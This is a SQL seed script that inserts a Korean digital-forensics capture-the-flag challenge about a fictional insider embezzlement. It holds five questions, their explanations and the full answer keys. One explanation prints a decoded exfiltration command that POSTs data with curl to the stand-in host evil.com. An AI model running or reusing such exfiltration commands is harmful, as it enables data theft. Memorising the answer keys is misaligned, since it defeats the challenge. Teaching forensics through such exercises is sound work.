-- =============================================================================
-- Ghost in the Shell: Protocol Zero 챌린지 추가
-- 기존 데이터를 유지하면서 새 챌린지만 추가합니다.
-- =============================================================================

BEGIN;

-- 기존에 같은 ID가 있으면 삭제 (재실행 대비)
DELETE FROM answer_keys WHERE question_id LIKE 'forensic-%';
DELETE FROM questions WHERE challenge_id = 'forensic-protocol-zero';
DELETE FROM challenges WHERE id = 'forensic-protocol-zero';

-- =============================================================================
-- 1. 챌린지 추가
-- =============================================================================

INSERT INTO challenges (id, title, subtitle, summary, tags, badge, difficulty, description, caution_text, dataset_label, dataset_file_name, dataset_description, dataset_download_url, restrict_dataset_url, is_published)
VALUES
  ('forensic-protocol-zero', 'Ghost in the Shell: Protocol Zero', '디지털 포렌식',
   '내부 횡령 사건의 디지털 흔적을 추적하여 진범을 밝혀내는 하드코어 포렌식 챌린지입니다.',
   '["포렌식","로그 분석","암호 해독","크로스 파일"]', NULL, 4,
   '당신은 대기업 보안팀의 디지털 포렌식 전문가입니다. 내부 횡령 사건이 발생했고, 해커는 VPN으로 IP를 세탁하고, 명령어를 난독화하며, 증거를 여러 파일에 분산시켰습니다. 웹 로그, 출입 기록, 터미널 히스토리, 직원 프로필, CCTV 영상을 교차 분석하여 진범을 찾아내세요.',
   '모든 증거는 제공된 데이터셋 내에 있습니다. 파일 간 상관관계 분석이 핵심입니다. Base64 디코딩, 이미지 반전(Mirror) 등 다양한 기법이 필요합니다.',
   '포렌식 데이터 5종', 'forensic_hardcore_data.zip', 'web_access_log.json, gate_entry_log.csv, terminal_history.txt, employee_profile.txt, cctv_snapshot.png',
   '/datasets/forensic_hardcore_data.zip', false, true);

-- =============================================================================
-- 2. 문제 추가 (5문제, 총 100점)
-- =============================================================================

INSERT INTO questions (id, challenge_id, "order", type, prompt, options, required, points, explanation) VALUES
  ('forensic-q1', 'forensic-protocol-zero', 1, 'SHORT',
   'web_access_log.json을 보면 해커는 VPN을 사용하여 IP를 지속적으로 세탁했습니다. 하지만 특정 요청의 HTTP Header에 실수로 실제 IP(Origin IP)가 노출된 흔적이 딱 하나 남아 있습니다. X-Forwarded-For 또는 Client-IP 헤더를 전수 조사하여 해커의 진짜 IP를 찾아내세요. (예: 192.168.1.1)',
   NULL, true, 20,
   '**정답: 203.0.113.42** - web_access_log.json에서 12:55:00Z의 POST /admin/transfer 요청에 X-Forwarded-For: 203.0.113.42 헤더가 있습니다. 이것이 VPN 뒤에 숨겨진 실제 IP입니다.'),

  ('forensic-q2', 'forensic-protocol-zero', 2, 'SHORT',
   '해커의 실제 IP(GeoIP 조회 결과: 부산)와 gate_entry_log.csv의 DEV_KIM 출입 기록(서울 본사, 12:30)을 대조하세요. 부산에서의 접속 시간(12:55)과의 시간차는 단 25분입니다. 이 이동이 물리적으로 불가능함을 증명하기 위해, 두 지점 사이의 최소 이동 속도(km/h)를 계산하여 정수 단위로 제출하세요. (직선거리 325km 가정)',
   NULL, true, 20,
   '**정답: 780** - 속도 = 거리 / 시간 = 325km / (25/60)h = 325 × 60 / 25 = 780km/h. KTX 최고속도(305km/h)의 2.5배, 물리적으로 불가능합니다.'),

  ('forensic-q3', 'forensic-protocol-zero', 3, 'SHORT',
   'terminal_history.txt를 보면 해커는 Base64 인코딩된 명령어를 eval로 실행했습니다. 난독화된 명령어를 복호화하여, 해커가 데이터를 외부로 빼돌리기 위해 사용한 도구(Tool) 이름만 입력하세요. (예: wget)',
   NULL, true, 20,
   '**정답: curl** - Base64 디코딩: echo "Y3Vyb..." | base64 -d → "curl -X POST http://evil.com/steal_data --data ''all_your_base''"'),

  ('forensic-q4', 'forensic-protocol-zero', 4, 'SHORT',
   '해커는 탈취한 자금의 지갑 주소를 3개 파일에 쪼개서 은닉했습니다. (1) web_access_log.json의 404 에러 URL 파라미터를 Base64 디코딩, (2) terminal_history.txt의 주석(#) 부분, (3) employee_profile.txt 끝에 숨겨진 텍스트를 조합하여 완전한 지갑 주소를 복원하세요.',
   NULL, true, 20,
   '**정답: 0x3f_Start_Middle_777_End_Code_X** - Part1: Base64(SGVhZGVy...)→"0x3f_Start_", Part2: # Key_Part2: Middle_777_, Part3: # Hidden_Key_Part3: End_Code_X'),

  ('forensic-q5', 'forensic-protocol-zero', 5, 'SINGLE',
   'cctv_snapshot.png는 서버실 유리벽에 비친 반사상입니다. 이미지 속 인물이 마우스를 쥔 손은 거울에 반전되어 보입니다. 이를 고려하여 employee_profile.txt와 대조한 뒤, 진범을 지목하세요.',
   '["DEV_KIM (왼손잡이)","SEC_PARK (오른손잡이)"]',
   true, 20,
   '**정답: SEC_PARK** - IP 203.0.113.42는 부산 지사(SEC_PARK IP 대역)입니다. 또한 CCTV가 거울상이므로, 이미지에서 왼손처럼 보이면 실제는 오른손 → SEC_PARK(오른손잡이)입니다.');

-- =============================================================================
-- 3. 정답 키 추가
-- =============================================================================

INSERT INTO answer_keys (question_id, answer) VALUES
  ('forensic-q1', '203.0.113.42'),
  ('forensic-q2', '780'),
  ('forensic-q3', 'curl'),
  ('forensic-q4', '0x3f_Start_Middle_777_End_Code_X'),
  ('forensic-q5', 'SEC_PARK (오른손잡이)');

COMMIT;

-- 확인 쿼리
SELECT id, title, difficulty FROM challenges WHERE id = 'forensic-protocol-zero';
SELECT id, "order", type, points FROM questions WHERE challenge_id = 'forensic-protocol-zero' ORDER BY "order";

